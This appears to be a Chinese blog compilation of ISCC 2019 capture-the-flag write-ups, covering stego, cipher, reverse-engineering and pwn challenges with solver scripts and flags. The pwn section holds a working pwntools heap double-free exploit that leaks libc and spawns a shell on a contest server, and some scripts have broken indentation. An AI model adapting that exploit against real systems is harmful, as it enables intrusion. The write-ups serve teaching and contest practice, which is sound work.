5.然后看到 checkPassword 这个方法，看来密码是 ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n 了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155844794371818b66800ffa1e600da008ef166ee5-1024x750.png)

6.输入进去试试。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558447996a86adf68b204bbae84ca8473fdd83dbd.png)

7.Flag 到手~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155844801386d02a6f2a35178f5b5ad53d9acb88df.png)

### Welcome

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558436928fc069f138644eb401a0cffed9122dfa9-1024x424.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15584371279ea0dd40e7ffa6a7b26671e4a4ee2309.zip)

知识点：密文分析

步骤：

1.解包，是个 Txt，打开看看。注意编码切成 GBK。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558437365737c04f988c02f25ca46daa3f39cfc21-1024x406.png)

2.然后来统计一下每一组词的出现频率。这里我们将每组词 md5 之后作为 dict 的 key，便于处理。

```
import hashlib

f = open("welcome.txt", "r")

s = f.readline().split(' ')

def md5(str):
    m = hashlib.md5()
    m.update(str.encode())
    h = m.hexdigest()
    return h

result = {}
for i in s:
    key = md5(i)
    if key not in result:
        print(i + " " + key)
        result[key] = 0
    result[key] += 1

print(result)`</pre>
```

3.运行一下，结果如下。其中有四组的数比较多。

分别是：

*   洮蓠朩暒戶囗
*   萇條戶囗
*   萇條蓅烺計劃
*   洮蓠朩暒蓅烺計劃

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558438077ee7c6dad957fd929103895e752459655-1024x261.png)

4.想了蛮久，想试试是不是这四个词分别代表 0 和 1，然后每八位代表一个 ASCII 字符，那我们写个脚本来跑一下每种代表的组合，看能跑出来些什么。

```
import hashlib

f = open("welcome.txt", "r")

s = f.readline().split(' ')

def md5(str):
    m = hashlib.md5()
    m.update(str.encode())
    h = m.hexdigest()
    return h

for s1 in range(0, 2):
    for s2 in range(0, 2):
        for s3 in range(0, 2):
            for s4 in range(0, 2):
                dicts = {md5('洮蓠朩暒戶囗'): str(s1), md5('萇條戶囗'): str(s2), md5('萇條蓅烺計劃'): str(s3), md5('洮蓠朩暒蓅烺計劃'): str(s4)}

                result = ''
                for i in s:
                    key = md5(i)
                    if key in dicts:
                        result += dicts[key]

                flag = ""
                for i in range(0, len(result), 8):
                    flag += chr(int(result[i:i + 8], 2))
                print(flag)
```

 5.啊哈，还真跑出来了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584382659eadc1dc0e9f1d22a3bb1dc367cc1de4-1024x404.png)

6.Flag 到手~最后一位自己修正下吧。

### 倒立屋

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584383208f3c03cba5ef706c8b67c9c2a254a386-1024x421.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558438333d13d0f8064b7d34321f7eeb53528728a.zip)

知识点：LSB，脑洞

步骤：

1.解压，是个这样的图。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558438402b5ca0d64977da545adfdbd94a771d392-1024x912.png)

2.hex 编辑器打开看看，没看到什么端倪。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155843849073d07769de43b9bfaa2f2d9b997588c2.png)

3.打开 [StegSolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve) 看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439106c36905e9bb0a64815b39022e4283e9e8-1024x925.png)

4.点 Analyse&#8211;Data Extract，然后 Bit Planes 逐位试试，发现 RGB 都点到 0 的时候（这里显示不全- -用 Tab 切过去忙打上的）开头有东西。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439283cf2756e09793c0a1dff2b00dc66574d3-1024x796.png)

5.直接提交不行，倒过来提交就行了。

6.Flag 到手~

### 无法运行的exe

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584393678afc1a829a0bd77c7ba3de94b2641b7b-1024x421.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439382bcf1dde0cf0754278fad69f92c41de18.zip)

知识点：分析，图片修复。

步骤：

1.解包看看，原本我是想图省事，就先拿 hex 编辑器打开看看了。没想到直接就看到里面是串 base64。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439605588cdfc57dd5bce203a5d4175929e554.png)

2.解个码看看，似乎是 png。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439653a739a5212ccbd4ca8f47db9aa1350ef6-892x1024.png)

3.那就找个工具把它转成文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584397032fab1917e1d09f52d62efa7e41ed9709-1024x687.png)

4.下载下来还是打不开。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439851c57932ff98604039b5dddde4007ea531.png)

5.找个工具修修。[https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558439984aa9d36af260eb339335716262de5ad08-1024x832.png)

6.打开修复之后的图片看看，是个二维码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584400168da3bb5c73ec3502ff6866b9f8837399-1024x653.png)

7.扫描得到 Flag~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558440108ffc9326ccfd48ab68bd4e2f69e7f2e79-473x1024.png)

8. Flag 到手~

### High起来！

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584402010d3a8b5703015a486819c176ee2235ef-1024x449.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15584404581a19a7d7d4954578becfbda693142114.zip)

知识点： MP3 隐写，当铺密码

步骤：

1.解包，打开，发现是个图片，但打不开。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558440561a69a450a262db02a9418630bee9a9323.png)

2.那就 binwalk 走一波，有个压缩包。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558440586e1f1e83bf5e04020fbfa722a97bc48fa-1024x221.png)

3.解压看看，是个 MP3。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584406608dd0f0bafb75dab856418457dd384ab8-1024x128.png)

4.Audacity  打开看看，没看见什么端倪。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558441379e421dcfd96421d6a28acfc0167b2f473-1024x693.png)

5.那么还是再回到之前这个 png 吧，hex 打开看看。发现开头有个 PNG，那么我们搜索 504B，把后面的其他数据去掉。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155844149226c0e7e030d4eb063a1e115c2ecc76e0.png)

6.然后用 PCRT 修复下。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155844158627756673886776a9c364d4dae2181812-1024x781.png)

7.发现是个二维码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558441626e54db8824ed4eb63ea36a2251454e86f-1024x788.png)

8.扫描一下，得到 中口由羊口中中大中中中井。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558452652d601647a999ba27c10ba69539a363169-473x1024.jpeg)

9.似乎是当铺密码，解密试试。得到 201902252228 [http://www.zjslove.com/3.decode/dangpu/index.html](http://www.zjslove.com/3.decode/dangpu/index.html)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558452848971df263534369dc800a3fee2b4cbc19-966x1024.png)

10.再用 mp3stego[https://www.petitcolas.net/steganography/mp3stego/](https://www.petitcolas.net/steganography/mp3stego/) 来处理下。

cd 到这里。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558453692eec3ce574e3ba4f3543b299e2b4b9411-1024x920.png)

> Decode.exe -X 01.mp3 -P 201902252228

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584537096000d96cca872cf0064a5b3a66c45e19-1024x354.png)

11.打开 01.mp3.txt，得到如下的 HTML Markup

`flag{PrEtTy_1ScC9012_gO0d}`

12.上个 Python 脚本解码。

```
import HTMLParser

s = 'flag{PrEtTy_1ScC9012_gO0d}'
h = HTMLParser.HTMLParser()
print(h.unescape(s))
```

13.运行

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155845393626e2845182b06998b948213644e7174c.png)

14.Flag 到手~

### 他们能在一起吗？

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584514391f8049457b54c83c178d05f50bf775a3-1024x449.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558451517aa51689aa4a49e61aa755d307dd39ca3.zip)

步骤：

1.是个二维码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558451552a6872a4e970464ce106f07aaf2c1194f-1024x659.png)

2.扫一下得 `UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=`，解码得 `PASS%7B0K_I_L0V3_Y0u%21%7D`，URL Decode 之后得 `PASS{0K_I_L0V3_Y0u!}`。看起来是密码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584516509d92403488b30fafe522b2c0543b7acc-988x1024.png)

3.binwalk 看下，还有个压缩文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155845174848620b7785f85384f00b9796a1a3ea00-1024x359.png)

4.解压，需要密码，填入上面得到的密码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558451829980c04c656b8a03cb6e7888ef0c42f0c-1024x192.png)

5.打开解压出来的文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558451847b8abe6e0d89c327631d03b37231499dc-1024x659.png)

6.Flag 到手~

PS: 我也想要女朋友呀ヾ(=･ω･=)o

### Keyes' secret

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584539960917c52f04fac73478d377542b89cb1b-1024x424.png)

附件：

[1558454024f70650512bf44e970cfb374b2ff43a0e](https://www.zhaoj.in/wp-content/uploads/2019/05/1558454024f70650512bf44e970cfb374b2ff43a0e.zip)[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558454024f70650512bf44e970cfb374b2ff43a0e.zip)

步骤：

1.解包之后是个文本文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155845414658de0d6152ff39122f762bf3d3ce1d3b-1024x659.png)

2.题面有提示键盘。那么就考虑是键盘密码了。上网找个脚本来解。[https://nitesculucian.github.io/2018/09/30/dctf-2018-message/](https://nitesculucian.github.io/2018/09/30/dctf-2018-message/)

这里我们就处理 {} 包起来的密文就好，因为这脚本里的字典和这题用到的还是有些不同的，要扩充太多就很累了。

最终 Python 脚本如下：

```
keyboard = [
    [[" "], ["QWERTY", "ASDFGH", "ZXCVBN"]],
    [["A"], ["XCVBGRD", "GRDXCVB", "ZSEFVCX"]],
    [["B"], ["WSXCFD", "RFVBHG", "QAZXDS", "YHNMKJ"]],
    [["C"], ["REDCV", "EWSXC", "TRFVB"]],
    [["D"], ["EDCVGR", "WSXCFE", "YHNMKU"]],
    [["E"], ["EDCVRF", "WSXCDE", "TGBNHY"]],
    [["F"], ["REDCF", "TRFVG", "EWSXD"]],
    [["G"], ["REDCVG", "CVGRED", "CVRGED"]],
    [["H"], ["WSXDRFV", "EDCFTGB", "RFVGYHN"]],
    [["I"], ["WSX", "EDC", "RFV"]],
    [["J"], ["UJMN", "WSXZ", "RFVC"]],
    [["K"], ["EDCFBY", "WSXDVR", "QAZSCE"]],
    [["L"], ["WSXCV", "EDCVB", "RFVBN"]],
    [["M"], ["ZAQWDRTGB", "XSWEFTYHN", "XSWEFTYNH"]],
    [["N"], ["ZAQWDVFR", "XSWEFTGB", "XSWEFTBG"]],
    [["O"], ["QAZXCDEW", "WSXCVFRE", "RFVBNHYT", "TGBNMJUY"]],
    [["P"], ["MNBVCCDERTG", "NBVCXSWERF", "NBVCXSWEFR"]],
    [["Q"], ["QAZXCDEWV", "EDCVBGTRN", "RFVBNHYTM"]],
    [["R"], ["MNBVCDRTGHU", "MNBVCDRTGHU", "MNBVCDRTGHU"]],
    [["S"], ["YTRFVCX", "IUYHNBV", "IUYHNBV"]],
    [["T"], ["WERTYFV", "RTYUIHN", "RTYUIHN"]],
    [["U"], ["WSXCVFR", "EDCVBGT", "EDCVBGT"]],
    [["V"], ["EFVGY", "WDCFT", "WDCFT"]],
    [["W"], ["EFVGYWDCFT", "EFVGYWDCFT", "EFVGYWDCFT"]],
    [["X"], ["WDVTDZ", "RGNYGC", "RGNYGC"]],
    [["Y"], ["JMYI", "EFVT", "EFVT"]],
    [["Z"], ["QWERDCVB", "ERTGVBN", "ERTGVBN"]]
]

def nliqwerty_dec(buf):
    dec_buf = buf
    result = ""
    while len(dec_buf) > 0:
        if dec_buf[:1] == '{' or dec_buf[:1] == '}' or dec_buf[:1] == '.' or dec_buf[:1] == ',':
            result += dec_buf[:1]
            dec_buf = dec_buf[1:]
            continue

        is_found = False
        for i in range(11, 2, -1):
            for count in range(0, 27):
                for j in keyboard[count][1]:
                    if dec_buf[:i] == j:
                        result += keyboard[count][0][0]
                        dec_buf = dec_buf[i:]
                        is_found = True
                        break

            if is_found:
                break

    print(result)

nliqwerty_dec("{WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU}")
```

3.运行

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558454422bf5673ad2ac71467723cacf4138432fc-1024x183.png)

4.Flag 到手~

### Aesop's secret

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558477212ebb7487f05d243675ca15d0eea727eff-1024x428.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558477280ec71d6dae69ff3fd67630a47b33a3615.zip)

知识点：拼图，AES 加密

步骤：

1.打开看看，是个 gif 图。而且一直在不同位置跳。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584773296f6e57a124b2e660ed63924753331cde.png)

2.找个工具分解下。[https://zh.bloggif.com/gif-extract](https://zh.bloggif.com/gif-extract)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558477520c39cb7678cb2b3bdc48893b906fc59d2-1024x560.png)

3.将其中间部分拼起来之后，是 “ISCC” 字样。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584777840919b9b503025918c1aef5dde195e14e.png)

4.而后用 hex 编辑器打开这个 gif 看看。最后这里有一段 Base64。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558477882c446bc63002143b0526b521bec63c5e5.png)

5.解码之后 Salted__Pi 开头，说明是 AES 加密。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155847793051c2a8d5d610f54f9afe051a1e01263e-1024x968.png)

6.[https://www.sojson.com/encrypt_aes.html](https://www.sojson.com/encrypt_aes.html) 解密试试，密码就是上面拼出来的 “ISCC” 。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558478028bcc34d50b27af2a4efbc58fffc13361d-1024x347.png)

7.对解密得到的东西再解密一次。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558478069d95a87e5107ef1d0966eedb6086ab950-1024x255.png)

8.Flag  到手~

### 碎纸机

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584783242bd14a1dabe8d93f85d74b5ebecbdeef-1024x427.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15584783609d1753fb745e4b2e4a1ef9106d1309c1.zip)

知识点：

步骤：

1.打开看看，是个图片。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155847853247ba57210c60a888e5a2ed04c9f90e4a-1024x815.png)

2. binwalk  走一波，有压缩包。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584786309f7bd1e34d0dc803f7928f9c13912c83-1024x672.png)

3.解压一下。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584787005f90993ce33535cb2a83bd93f12dc94d-1024x370.png)

4.简单看看，是一堆拼图和一个文本文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155847875669a875900441c7848cafe767688aeab7-1024x580.png)

文本文件内容如下：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584787825c3cfc767d12bbf8fda86541cf26fbec-1024x659.png)

OpenCV？看来得从图片入手。

5.用 hex 编辑器打开这些图片，发现最后有东西。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558479025fe76c5413b3376b8f03c666d868e51e6-1024x523.png)

6.将 FFD9 之后的十六进制值复制到文本编辑器，搜索 00，开高亮。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155847937450ad7ab8e90135e7e5431f5436e90c69-1024x625.png)

7.不断调整窗口大下，并设置让内容适应窗口大小。可以看到非 00 的部分是可以拼成字符的。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584794538489056caa067c0bc373d1b1fd1ee276-893x1024.png)

第一幅图看来就是 Fl 了。

8.对剩下几幅图也如法炮制。每幅图的内容可能有重复，自己看的时候细心些。

第二幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584795227de9eb74e57e43d72beaf28d7642fd6f-893x1024.png)

ag=

第三幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558479653ed5688b683fd4b7bacb6d360b987ac43-776x1024.png)

{ISC

第四幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558479793e413d6a96cbf03c4bce822be4fbfab67-776x1024.png)

C_

第五幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155847988446e54c93977f9d53b042c04daa8f4ab6-776x1024.png)

is_s(这里比较难看，不过最后拼出来之后是个英语句子，所以可以按照内容修正下）

第六幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558480113790a678d4a25465722d18430a3c70160-776x1024.png)

o_i

第七幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558480198f88e9684dd82cc796dea10bf2faf325d-776x1024.png)

nter

第八幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558480264ae0a6f111dd9d4ec3238c672f9f3ae52-776x1024.png)

esti

第九幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558480325ed8d9aa49c5152fe871d8a8f9634402e-776x1024.png)

ng_

第十幅图：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558480364e43fbb79424f874cfbf2427d21d3cfe3-776x1024.png)

!}

9.拼起来，就是 `Flag={ISCC_is_so_interesting_!}`

10.Flag 到手~


## Reverse
转载自：安全客-[ISCC2019部分writeup作者：Henu_摇光](https://www.anquanke.com/post/id/179216)
### answer to everything

ida载入main函数一键f5，审计一波发现以下关键：

![](https://p3.ssl.qhimg.com/t010adb95d57962ffa9.png)

不带任何标签提交，结合题目提示sha1， kdudpeh 的sha1值即为所要flag

###  dig dig dig

用IDA载入分析
![](https://p0.ssl.qhimg.com/t016616e9dfdb76e913.png)

发现对字符串进行了三次加密

分别为BASE64,ROT13,UUencode

![](https://p3.ssl.qhimg.com/t01ccfbf5fbe4b65058.png)

对字符串逆着进行三次解密，得到flag

![](https://p0.ssl.qhimg.com/t01ccbe7e5b61fdd1e4.png)

![](https://p2.ssl.qhimg.com/t01a127c8efaf4de35d.png)

![](https://p2.ssl.qhimg.com/t010b727c4faa860837.png)

### 简单Python

题目内容很简单

提示说要逆向一个pyc

虽然没有了解过这个东西，不过在网上找到了在线的反编译工具

直接拉进去 运行

得到如下内容：

```
import base64

def encode(message):
    s = ''
    for i in message:
        x = ord(i) ^ 32
        x = x + 16
        s += chr(x)

    return base64.b64encode(s)

correct = 'eYNzc2tjWV1gXFWPYGlTbQ=='
flag = ''
print 'Input flag:'
flag = raw_input()
if encode(flag) == correct:
    print 'correct'
else:
    print 'wrong'
```

这就很棒了

源码都有了 什么是逆不出来的

这里需要注意一下的是correct的内容最好不要用网上的Base64解码工具解码

最好用Python的base64模块解码

简单写一下Python得到decode后的字符串

```
yx83sskcY]`\Ux8f`iSm
```

然后写一个脚本，跑一下就出来了

脚本如下：

```
#include <iostream>

using namespace std;

int main ()

{

    char buffer[512]="yx83sskcY]`\Ux8f`iSm";

    for(int i=0;i<strlen(buffer);i++)

    {

        buffer[i]-=16;

        buffer[i]^=32;

    }

    for(int i=0;i<strlen(buffer);i++)

    cout<<buffer[i];

    return 0;

}
```

结束。

### Rev04

拉入od提示文件损坏，去百度elf文件的格式，发现其格式不固定，格式基本固定的地方又没有发现有什么明显的错误，但是记事本打开查看内容时发现一串极为可疑的字符：

数了下长度，符合base64加密的密文长度，base64转码，果然有问题：

![](https://p2.ssl.qhimg.com/t01d4459ed97ad147b0.png)

`uggc://VFPP2019{hey_frrzf_ebggra_jvgu}pgs.pbz`

显然是flag密文，多次解密尝试后发现是rot13加密，在线解rot13即可

### Rev01

这是一个rust逆向。载入ida分析

![](https://p5.ssl.qhimg.com/t017b9db92d6638b8de.png)

需要留意，rust语言写出来的程序其主函数为“beginer_reverse::main::……..”，所以对main反编译是找不到正确的东西的。

![](https://p5.ssl.qhimg.com/t010723a6f8c68179fc.png)

进入之后即看到一串明显像是密文的东西。向下翻找到唯一一个具备加密转码性质的代码

![](https://p5.ssl.qhimg.com/t017b62c216c99baedf.png)

其中 v33 恰是开头的v0，很明显就是将上面的内容转码后和输入进行比对，仔细审计中间的代码会发现v15对应的是输入。写出解密脚本：
```
# coding=utf-8

cipher = [0x00000154,0x00000180,0x000001FC,0x000001E4,0x000001F8,0x00000154,0x00000190,0x000001BC,0x00001BC,0x000001B8,0x00000154,0x000001F8,0x0000194,0x00000154,0x000001B4,0x000001BC,0x00001F8,0x00000154,0x000001F4,0x00000188,0x00001AC,0x000001F8,0x00000154,0x0000018C,0x00001E4,0x00000154,0x00000190,0x000001BC,0x154,0x90]

#以上数据经过转码后拿到数据要进行一次ascii码转换，但是第一次转出来的是str类型下的数字，不能直接输出ascii码对应的字符，所以需要用chr()处理一下
cipher2=''
for i in range(len(cipher)):
    cipher2+=chr((cipher[i]>>2)^0xA)
print cipher2
#也可以用一个直接点的代码处理
cipher1 = ''.join(map(lambda x: chr((x>>2) ^ 0xa), cipher))
print cipher1
```

## Pwn
转载自：安全客-[ISCC2019部分writeup作者：Henu_摇光](https://www.anquanke.com/post/id/179216)
### pwn02

```
from pwn import *
#context.log_level = 'debug'

IP = '39.100.87.24'
PORT = 8102
LOCAL = 0

if LOCAL:
sh = process('./pwn02')
else:
sh = remote(IP, PORT)

def debug(cmd=''):
gdb.attach(sh, cmd)
pause()

def malloc(idx, size, ctx):
sh.recvuntil('&gt; ')
sh.sendline('1 '+str(idx))
sh.sendline(str(size))
sh.sendline(ctx)

def free(idx):
sh.recvuntil('&gt; ')
sh.sendline('2 '+str(idx))

def puts(idx):
sh.recvuntil('&gt; ')
sh.sendline('3 '+str(idx))

malloc(0, 0x58, "aa")
malloc(1, 0x58, "bb")
malloc(2, 0x58, "cc")
malloc(3, 0x80, "dd")
malloc(4, 0x10, "ee")

# unsorted bin leak
free(3)
puts(3)
leak = sh.recvuntil('x7f').ljust(8, "x00")
leak = u64(leak)

libc_base = 0
if LOCAL:
libc_base = leak-3951480
else:
libc_base = leak-3951480

# ubuntu 1604 server
log.success("libc base: %s" %hex(libc_base))

# double free
free(0)
free(1)
free(0)

payload = "f"*80
payload += p64(0)+p64(0x61)
payload += p64(0x600dba)

malloc(5, 0x58, payload)
malloc(6, 0x58, "gg")

system = libc_base + 0x45390
payload = "h"* 6 + p64(system)*2
malloc(7, 0x58, payload)

malloc(8, 0x20, "/bin/shx00")
free(8)

#debug()

sh.interactive()
```

# 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---
